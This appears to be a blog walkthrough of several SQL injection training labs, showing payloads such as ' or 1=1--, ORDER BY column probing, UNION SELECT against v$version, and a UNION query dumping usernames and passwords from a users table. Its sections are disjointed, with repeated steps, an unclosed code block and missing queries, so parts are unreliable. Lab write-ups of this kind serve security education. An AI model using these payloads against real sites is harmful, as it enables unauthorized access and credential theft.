To display one or more unreleased products, we can use the payload ```' or 1=1--```, make sure this is url encoded to something like this ```'+or+1%3d1--```.

First thing to do is to confirm the number of columns available in the database

So, we'll be using the query
```
' order by 1--
' order by 2--
' order by 3--
```
Ensure this is url encoded, so when you get the internal server error, it means the column number isn't available

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/46cca6a6-9af2-41e9-a473-8f2388847fce)

This means there's a column available in the database,

This makes it 2 columns available in the database,

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/28d25efa-ca02-4434-93ae-a908703068d9)

From the above screenshot you'll see that the query ```' order by 3--``` returned an Internal Server Error, which means there isn't a column 3 available in the database.

So, we have 2 columns available in the database.

To query the database version we can use the following query 
```
' UNION SELECT banner,null FROM v$version--
```
Explaining this
```
The banner column contains the information about the database version
The null is just there to fill in for the second column of the result
v$version is the name of a database table
```

```
' UNION SELECT null--
' UNION SELECT null,null--
' UNION SELECT null,null,null--
' UNION SELECT null,null,null,null--

So, we'll continue the query like that until we get a ```HTTP response code 200 OK```.

First, lets determine the number of columns that's available in the database using the query
```
' order by 1--
' order by 2--
' order by 3--
' order by 4--
```
Ensure you url encode the query when you use it.

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/35bea675-b7b5-4d8e-993b-ff1ad4d566ed)

This means we have a column available in the database.

Alright, so we have 2 columns available in the database.

Moving on,

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/4c1dded8-aae8-4cfb-bf45-cf8e5c5ce5b7)

So, there are 3 columns available in the database.

Moving on,

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/57d2fbcb-1b69-46c3-8028-834fe6d48e15)

We got an "Internal Server Error" meaning there isn't a column 4 in the database

Hence, we have 3 columns available in the database.

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/50143fc9-d043-43bc-97bd-d2251d5125d7)

So, the task is to check which of the columns is compatible with string data. So, we are asked to return the string ```yuJfMW```.

Now, lets start by using the ```UNION``` method to confirm the number of columns. We can use the query
```
' UNION SELECT null,null,null--
```
If we don't get the "Internal Server Error" it means there truly are 3 columns available in the database. 

Applying the query

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/201c39b0-c764-4f39-9aa2-86627659a7c7)

cool, now lets look for the vulnerable column that is compatible with string data. We can try the following queries
```
' UNION SELECT 'yuJfMW',null,null--
' UNION SELECT null,'yuJfMW',null--
' UNION SELECT null,null,'yuJfMW'--
```
So, a query not returning the "Internal Server Errror" means the column where the string is positioned is vulnerable.

Applying the queries,

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/8b2d5383-4809-44bb-88ab-a5340f8d49e1)

From the above screensots, you'll see that only the query ```' UNION SELECT null,'yuJfMW',null--``` was able to retrieve the string from the database.

Lets try to show the response in our browser

Cool, we have successfully solved the lab. So, it is safe to say the second column is compatible with string data.

Now, this should be an easy one since they already gave us the name of the table to be ```users```, also in the table there are columns ```username``` and ```password```. So, what we'll try to do is just determine the number of columns available in the database. We'll be using the query

The "Internal Server Error" displayed is to tell us that there isn't a third column in the database.

So, we have 2 columns available in this database

Now, lets go ahead and dump the content of the columns ```username``` and ```password``` in the table ```users```. We can use this query
```
' UNION SELECT username,password FROM users--
```
Applying this query
